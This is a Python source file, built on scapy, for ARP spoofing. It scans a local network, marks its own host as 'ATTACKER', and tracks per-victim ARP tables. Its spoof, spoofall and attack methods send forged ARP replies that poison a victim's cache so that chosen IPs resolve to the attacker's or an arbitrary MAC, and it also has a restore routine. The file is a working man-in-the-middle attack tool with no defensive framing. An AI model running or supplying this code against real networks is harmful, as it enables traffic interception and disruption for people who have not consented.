import copy
import scapy.all as scapy
from tabulate import tabulate

#Quit verbose
scapy.conf.verb = 0

class ArpTable:

    #Static variable. Main Arp Table, it's the template of all the victim's tables
    table = []
    IP = ""
    MAC = ""
       

    def __init__(self):
        #If the table variable of an instance changes, its static version variable will change too because the copied arrays share the same memory address, so
        #the victim table will be a deep copy of the Main table.
        self.table = copy.deepcopy(ArpTable.table)
        

    def arpscan(network):
        """
        This static method will scan the provided network and will save the results into the template table.    
        
        Args:
            network (string): The network to be scanned (EX: 192.168.0.0/24).
        """
        
        #Scan the network with the scapy module
        request = scapy.ARP()
        broadcast = scapy.Ether()

        #Save Own address
        ArpTable.IP = request.psrc
        ArpTable.MAC = broadcast.src
        

        request.pdst = network
        broadcast.dst = 'ff:ff:ff:ff:ff:ff'

        req_broadcast = broadcast / request
        hosts = scapy.srp(req_broadcast, timeout = 1)[0]

        for host in hosts:
            
            #Extract the IPs and the MACs of the host and put them into the template table
            IP = host[1].psrc
            MAC = host[1].hwsrc
            DESC = "FREE"

            ArpTable.table.append([IP, MAC, DESC])

        #Append the attacker addr
        address = [ArpTable.IP, ArpTable.MAC, "ATTACKER"]
        ArpTable.table.append(address)


    def show(self):
        """This method prints the Arp Table of the victim"""
        
        print("\n-------------------------------------------------------")
        print("Arp Table of " + self.IP)
        header = ["IP", "MAC", "STATUS"]
        print(tabulate(self.table, headers = header,  tablefmt="grid", showindex="always"))





    def spoof_row(self):
        """This method changes the MAC address of the selected row"""

        self.show()
        row = int(input("\n> Select a row to spoof > "))

        mac_spoof = input("> MAC in row " + str(row) + " will be replaced by MAC > ") 

        #Apply the changes on the victim table
        self.table[row][1] = mac_spoof
        self.table[row][2] = "SPOOFED"      


        #Change the status of the affected IP to "HACKED", but in template table
        ArpTable.table[row][2] = "HACKED"

        self.show()       




    
    def spoof(self, arpip):

        row = 0
        for n, r in enumerate(self.table):
            if arpip == r[0]:
                row = n
                
        

        self.table[row][1] = ArpTable.MAC
        self.table[row][2] = "SPOOFED"

        #Change the status of the affected IP to "HACKED", but in template table
        ArpTable.table[row][2] = "HACKED"

        self.show()
        



    def spoofall(self):

        for n, addr in enumerate(self.table):
            if addr[2] == "ATTACKER":
                continue
            if addr[0] == self.IP:
                ArpTable.table[n][2] = "HACKED"


            self.table[n][1] = ArpTable.MAC
            self.table[n][2] = "SPOOFED"



    def restore(self):
                
        for n, addr in enumerate(self.table):


            if addr[2] == "SPOOFED":
                self.table[n][1] = ArpTable.table[n][1]

                #Send restore packets
                restored_ip = addr[0]
                restored_mac = addr[1]

                packet = scapy.ARP(op = 2, pdst = self.IP, hwdst = self.MAC, hwsrc = restored_mac, psrc = restored_ip)

                scapy.send(packet, verbose=False)

                print("\nsent to {}: {} is at {}".format(self.IP, restored_ip, restored_mac))

                self.table[n][2] = "FREE"
                

            if addr[0] == self.IP:
                ArpTable.table[n][2] = "FREE"

            
            

            

    
    def attack(self):

        for addr in self.table:
            if addr[2] == "SPOOFED":
                ip_spoof = addr[0]
                mac_spoof = addr[1]

                packet = scapy.ARP(op = 2, pdst = self.IP, hwdst = self.MAC, hwsrc = mac_spoof, psrc = ip_spoof)

                scapy.send(packet, verbose=False)

                print("\nsent to {}: {} is at {}".format(self.IP, ip_spoof, mac_spoof))





    





        



        

